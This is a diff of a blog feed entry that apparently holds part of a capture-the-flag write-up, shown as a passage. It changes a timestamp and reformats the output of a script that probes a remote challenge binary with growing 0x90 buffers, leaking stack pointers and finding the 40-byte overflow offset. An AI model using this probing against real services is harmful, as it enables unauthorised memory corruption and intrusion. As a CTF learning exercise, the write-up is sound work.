@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/n4sm/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/n4sm/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-05-14T22:28:25+02:00</updated>
+    <updated>2022-05-20T02:20:23+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -84,92 +84,92 @@ So, no source code is provided, we juste have a netcat to which we can interact.
     <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">find_padding</span><span class="p">()))</span>
-</code></pre></div><p>It&rsquo;s basically checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and returns the corresponding padding. We do not check if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s2">&#34;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;\xad\xe9\x7fBye!\n&#34;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="m">40</span>
-</code></pre></div><p>So now we know that we need 40 bytes of padding before the crash.</p>
+</code></pre></div><p>It&rsquo;s basically sending checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
+<pre tabindex="0"><code>$ ./solve.py
+[*] sending: b'\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n'
+[*] sending: b'\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x907:EL\xd3\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\xda5r^\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b&quot;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'\xad\xe9\x7fBye!\n&quot;
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd6\x97\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc1\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xe3\xb0\xff\xff\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x15\x12\xfc\x7fBye!\n'
